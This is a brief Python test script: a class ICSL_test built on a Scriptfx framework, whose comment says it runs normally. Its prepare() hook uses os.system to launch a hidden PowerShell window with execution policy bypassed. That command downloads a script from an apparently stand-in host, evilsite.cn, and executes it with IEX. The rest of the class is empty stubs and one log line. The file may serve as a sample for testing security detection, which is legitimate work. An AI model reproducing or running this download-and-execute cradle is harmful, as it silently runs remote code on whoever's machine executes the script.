# -*- coding: utf-8 -*-
# 可正常执行
from scriptfx import Scriptfx


class ICSL_test(Scriptfx):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        pass

    def prepare(self):
        import os
        cmd = "powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://www.evilsite.cn/tema-icsl.ps1')\""
        os.system(cmd)
        pass

    def process(self):
        self.logger.info("1")

    def postlude(self):

        pass
    def failure(self):
        pass

    def restore(self):
        pass
